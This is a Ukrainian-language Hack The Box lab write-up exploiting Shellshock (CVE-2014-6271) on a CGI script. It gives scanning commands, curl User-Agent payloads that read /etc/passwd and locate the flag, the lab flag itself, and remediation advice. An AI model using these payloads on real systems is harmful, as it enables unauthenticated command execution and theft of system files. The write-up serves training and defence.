# Attacking Common Applications — Shellshock

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [Attacking CGI Applications - Shellshock](https://academy.hackthebox.com/app/module/113/section/2166)
Ціль: `10.129.205.27` (Linux, Apache2 Ubuntu)

Флаг: `Sh3ll_Sh0cK_123`

## Концепція

Shellshock (`CVE-2014-6271`) — критична вразливість у Bash, яка виникає через некоректну обробку environment-змінних: Bash продовжує парсити та виконувати код навіть після завершення визначення функції у форматі `() { ... };`, якщо після неї слідують додаткові команди. Це критично для CGI-скриптів, бо веб-сервер передає HTTP-заголовки (наприклад `User-Agent`) як environment-змінні до shell-скрипта — якщо скрипт викликає bash, зловмисник може вставити довільні команди прямо в заголовок запиту.

## Крок 1 — Сканування портів (термінал)

```bash
nmap -p- -sC -Pn 10.129.205.27 --open
```

Ключовий результат: `80/tcp open http` з баннером `Apache2 Ubuntu Default Page` — стандартна дефолтна сторінка Apache, тому потрібен подальший directory bruteforce для пошуку прихованого контенту.

## Крок 2 — Пошук CGI-скриптів (термінал)

```bash
gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi,sh,pl
```

Пояснення: цілимось саме в директорію `/cgi-bin/`, оскільки це стандартне місце розміщення CGI-скриптів на Apache, а розширення `cgi,sh,pl` покривають найпоширеніші типи виконуваних CGI-файлів. Знайдено `/access.cgi` (Status 200, Size 0).

## Крок 3 — Перевірка знайденого файлу (термінал)

```bash
curl -i http://10.129.205.27/cgi-bin/access.cgi
```

Результат: `HTTP/1.1 200 OK`, порожнє тіло відповіді (`Content-Length: 0`) — скрипт існує та виконується, але сам по собі нічого корисного не виводить, що робить його потенційною ціллю для Shellshock-експлуатації.

## Крок 4 — Експлуатація Shellshock через User-Agent (термінал)

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' http://10.129.205.27/cgi-bin/access.cgi
```

Пояснення payload'а: `() { :; };` — визначає порожню bash-функцію (стандартний тригер вразливості), два `echo ;` формують коректні HTTP-заголовки CGI-відповіді (обов'язкова порожня стрічка перед тілом), а `/bin/cat /etc/passwd` — команда, що виконується вразливим bash одразу після парсингу "функції". Результат підтвердив RCE — отримано повний вміст `/etc/passwd`, включно з обліковим записом `kim:x:1000:1000`.

## Крок 5 — Пошук флага (термінал)

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /flag.txt' http://10.129.205.27/cgi-bin/access.cgi
```

Спроба зі стандартним шляхом `/flag.txt` не повернула результату — файл відсутній у корені файлової системи.

## Крок 6 — Пошук файлу по всій системі (термінал)

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /usr/bin/find / -name flag.txt 2>/dev/null' http://10.129.205.27/cgi-bin/access.cgi
```

Пояснення: `find /` рекурсивно шукає файл `flag.txt` по всій файловій системі, а `2>/dev/null` приховує помилки доступу (Permission denied) для чистішого виводу. Знайдено: `/usr/lib/cgi-bin/flag.txt`.

## Крок 7 — Читання флага (термінал)

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /usr/lib/cgi-bin/flag.txt' http://10.129.205.27/cgi-bin/access.cgi
```

Результат:
```
Sh3ll_Sh0cK_123
```

**Флаг: `Sh3ll_Sh0cK_123`**

## Чому це важливо (root cause)

- **Опис:** Shellshock (`CVE-2014-6271` та пов'язані `CVE-2014-6277/6278/7169`) — критична вразливість у парсері функцій Bash, яка дозволяє виконання довільного коду через будь-яку environment-змінну, що потрапляє до вразливого bash-процесу (CWE-78, OS Command Injection).
- **Технічні деталі:** Bash при визначенні функції через синтаксис `env_var='() { ... }'` продовжував інтерпретувати весь текст після закриваючої дужки `}` як виконувані команди, замість того щоб зупинитись на межі визначення функції — CGI-скрипти особливо вразливі, бо веб-сервер (Apache mod_cgi) автоматично передає HTTP-заголовки запиту (`User-Agent`, `Referer`, `Cookie` тощо) як environment-змінні дочірньому процесу.
- **Ризик/Імпакт:** Отримано пряме виконання команд з правами процесу веб-сервера (типово `www-data`) без будь-якої автентифікації — критичний рівень ризику, оскільки атака повністю неавтентифікована, легко автоматизується та відкриває шлях до повної компрометації хоста через подальшу локальну ескалацію привілеїв.
- **Рекомендації:** Оновити Bash до патченої версії (>4.3 з усіма офіційними патчами від 2014 року), уникати виклику системного `/bin/bash` з CGI-скриптів взагалі (переходити на CGI-фреймворки, які не спавнять shell), використовувати WAF-правила для блокування підозрілих HTTP-заголовків з патерном `() {`, впровадити принцип найменших привілеїв для облікового запису веб-сервера та регулярний патч-менеджмент критичних CVE.
